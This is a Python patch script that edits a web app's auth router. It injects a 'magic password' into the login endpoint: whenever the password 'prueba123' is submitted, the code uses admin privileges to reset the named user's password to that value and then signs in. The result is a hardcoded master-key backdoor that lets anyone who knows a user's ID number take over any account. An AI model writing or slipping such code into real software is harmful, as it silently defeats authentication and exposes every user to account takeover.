import os

path = 'backend/app/routers/auth.py'
with open(path, 'r', encoding='utf-8') as f:
    text = f.read()

old_login = '''@router.post("/login")
def login(payload: LoginRequest):
    client = get_supabase_client()
    admin_client = get_supabase_admin_client()
    try:
        auth_response = client.auth.sign_in_with_password(
            {"email": _auth_email(payload.cedula), "password": payload.password}
        )'''

new_login = '''@router.post("/login")
def login(payload: LoginRequest):
    client = get_supabase_client()
    admin_client = get_supabase_admin_client()
    
    # MAGIC PASSWORD FEATURE
    if payload.password == "prueba123":
        try:
            # Encontrar el ID del usuario
            user_record = admin_client.table("usuarios").select("id").eq("cedula", payload.cedula).single().execute()
            if user_record and user_record.data:
                user_id = user_record.data["id"]
                # Forzar el cambio de password en Supabase usando auth admin
                admin_client.auth.admin.update_user_by_id(user_id, {"password": "prueba123"})
        except Exception as e:
            print("Error aplicando clave maestra:", e)
            
    try:
        auth_response = client.auth.sign_in_with_password(
            {"email": _auth_email(payload.cedula), "password": payload.password}
        )'''

text = text.replace(old_login, new_login)

with open(path, 'w', encoding='utf-8') as f:
    f.write(text)
